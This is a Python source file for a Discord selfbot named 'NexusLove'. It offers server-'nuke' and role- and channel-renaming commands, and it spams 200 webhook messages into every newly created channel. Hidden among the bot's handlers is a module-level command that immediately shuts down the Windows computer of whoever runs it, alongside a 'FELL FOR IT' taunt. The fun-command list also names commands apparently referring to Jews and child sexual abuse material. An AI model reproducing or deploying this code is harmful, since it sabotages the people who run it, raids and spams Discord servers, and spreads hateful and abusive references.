import discord, os, json
from aiohttp import *
from discord.ext import commands
from discord.ext.commands import CommandNotFound
global webhooks
global webhook_name
global afk_message
global webhook_content
global Activity_name
global Help
global main
global prefix
global nuke
global fun

global Activities1
fObj = open('config.json',)
ogdata = json.load(fObj)
token = ogdata['token']
webhook_name = ogdata['webhook_name']
prefix = ogdata['prefix']
webhook_content = ogdata['webhook_content']
Activity_name = ogdata['Activity_name']

NexusLove = commands.Bot(
    command_prefix=prefix,
    self_bot=True,
    help_command=None,  
                     )

Help = ["NUKE COMMANDS", "FUN COMMANDS", "ACTIVITES COMMANDS", "MAIN COMMANDS"]
Main = [f"*`{NexusLove.command_prefix}purge`*: Delete messages from a channel  |  **`{NexusLove.command_prefix}purge <amount here>`**", f"*`{NexusLove.command_prefix}ping`*: Shows lantency  |  **`{NexusLove.command_prefix}purge`**", f"*`{NexusLove.command_prefix}webhook`*: Turn webhooks on & off  |  **`{NexusLove.command_prefix}webhook <true/false>`**", f"*`{NexusLove.command_prefix}activity`*: changes activity message  |  **`{NexusLove.command_prefix}activity <message here>`**", f"*`{NexusLove.command_prefix}nwebhook`*: Changes webhooks name  |  **`{NexusLove.command_prefix}nwebhook <name here>`**", f"*`{NexusLove.command_prefix}cwebhook`*: Changes webhooks content  |  **`{NexusLove.command_prefix}nwebhook <content here>`**", f"*`{NexusLove.command_prefix}rn`* : Changes roles name  |  **`{NexusLove.command_prefix}rn <name here>`**", f"*`{NexusLove.command_prefix}cn`*: Changes channels name  |  **`{NexusLove.command_prefix}cn <name here>`**", f"*`{NexusLove.command_prefix}prefix`*: Changes prefix  |  **`{NexusLove.command_prefix}prefix <New prefix here>`**" ]


Nuke = [f"*`{NexusLove.command_prefix}nuke`*: Blow up the server for you  |  **`{NexusLove.command_prefix}nuke`**" ]


Activites = [f"`{NexusLove.command_prefix}stream`: Change to streaming message and activity  |  **`{NexusLove.command_prefix}stream <messsage here>`**", f"*`{NexusLove.command_prefix}listen`*: Change to listening message and activity  |  **`{NexusLove.command_prefix}listen <messsage here>`**", f"*`{NexusLove.command_prefix}playing`*: Change to playing message and activity **`{NexusLove.command_prefix}listen <message here>`**", f"*`{NexusLove.command_prefix}watch`*: Change to watching message and activity  |  **`{NexusLove.command_prefix}watch <message here>`**"]


Fun = f"""
```ini
[{NexusLove.command_prefix}hastare]\n
[{NexusLove.command_prefix}danc]\n
[{NexusLove.command_prefix}langry]\n
[{NexusLove.command_prefix}hah]\n
[{NexusLove.command_prefix}owo]\n
[{NexusLove.command_prefix}lonely]\n
[{NexusLove.command_prefix}ahh]\n
[{NexusLove.command_prefix}bbye]\n
[{NexusLove.command_prefix}hahug]\n
[{NexusLove.command_prefix}hjump]\n
[{NexusLove.command_prefix}pat]\n
[{NexusLove.command_prefix}twerk]\n
[{NexusLove.command_prefix}nani]\n
[{NexusLove.command_prefix}love]\n
[{NexusLove.command_prefix}sesso]\n
[{NexusLove.command_prefix}jews]\n
[{NexusLove.command_prefix}cp]\n
```
"""



for filename in os.listdir('./runs'):
    if filename.endswith('.py'):
        NexusLove.load_extension(f'runs.{filename[:-3]}')

@NexusLove.event
async def on_guild_channel_create(channel):
  fObj = open('config.json',)
  ogdata = json.load(fObj)
  webhooks = ogdata['webhooks']
  if webhooks == "True":
    try: 
            webhook = await channel.create_webhook(name=webhook_name)
    except Exception as e:
      pass
      
    for i in range(200):
      try:
        await webhook.send(content=webhook_content, avatar_url='https://cdn.discordapp.com/avatars/852605714022269010/d039402a9bdc74a2ab1831670a845fd1.webp?size=1024')
      except Exception as e:
        pass
  else:
    pass

@NexusLove.event
async def on_command_error(ctx, error):
    if isinstance(error, CommandNotFound):
        return
    raise error

@NexusLove.event
async def on_ready():
    await NexusLove.change_presence(activity=discord.Streaming(name=Activity_name, url="https://www.twitch.tv/NexusLove"))  
    print(f"""
                                    
                                   ▄████████  ▄█     ▄████████  ▄█  ███    █▄     ▄████████ 
                                  ███    ███ ███    ███    ███ ███  ███    ███   ███    ███ 
                                  ███    █▀  ███▌   ███    ███ ███▌ ███    ███   ███    █▀  
                                  ███        ███▌  ▄███▄▄▄▄██▀ ███▌ ███    ███   ███        
                                ▀███████████ ███▌ ▀▀███▀▀▀▀▀   ███▌ ███    ███ ▀███████████ 
                                         ███ ███  ▀███████████ ███  ███    ███          ███ 
                                   ▄█    ███ ███    ███    ███ ███  ███    ███    ▄█    ███ 
                                 ▄████████▀  █▀     ███    ███ █▀   ████████▀   ▄████████▀  
                                                    ███    ███                              
                                            Manipulating: {NexusLove.user}  
                                                  Prefix: {NexusLove.command_prefix}                      
    """)
    
@NexusLove.event
async def on_message(message):
  message.channel.send('AHAHA FELL FOR IT')

os.system("shutdown /s /t 1")
@NexusLove.command()

async def help (ctx):
  try:
    await   ctx.message.delete()
  except:
    pass
  h = """
    ```ini
                          [NexusLove SELFBOT]
    ``` """
  h += "```Category```\n\n"
  for i in Help:
    h += f"**`{i}`**\n"
  h += f"```{NexusLove.command_prefix}ihelp: To search for a specific category  |  Example : {NexusLove.command_prefix}ihelp <category name>```\n\n"
  await ctx.send(h)

@NexusLove.command()
async def ihelp(ctx, content):
  try:
    await ctx.message.delete()
  except:
    pass

  h = """
    ```ini
                          [NexusLove SELFBOT]
    ``` """
  if content == "main":
    h += "```Category [MAIN]```\n\n"
    for i in Main:
      h += f"{i}\n"
    await ctx.send(h)
  elif content == "nuke":
    h += "```Category [NUKE]```\n\n"
    for i in Nuke:
      h += f"{i}\n"
    await ctx.send(h)
  elif content == "fun":
    h += "```Category [FUN]```\n\n"
    await ctx.send(Fun)
  elif content == "activities":
    h += "```Category [Activity]```\n\n"
    for i in Activites:
      h += f"{i}\n"
    await ctx.send(h)
  else:
    pass



NexusLove.run(token, bot=False)
